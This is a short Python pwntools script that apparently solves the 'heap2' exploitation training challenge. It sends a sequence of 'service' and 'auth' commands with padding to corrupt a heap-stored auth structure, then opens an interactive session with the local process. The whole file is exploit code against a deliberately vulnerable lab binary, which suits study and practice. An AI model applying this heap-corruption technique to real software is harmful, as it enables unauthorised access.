from pwn import *

p = process("./heap2")

payload = b"service"
p.sendline(payload)

payload = b"auth "
payload += B"A" * 5
p.sendline(payload)

payload = b"service"
payload += b"A" *( 0x20 - len(payload))
p.sendline(payload)


p.interactive()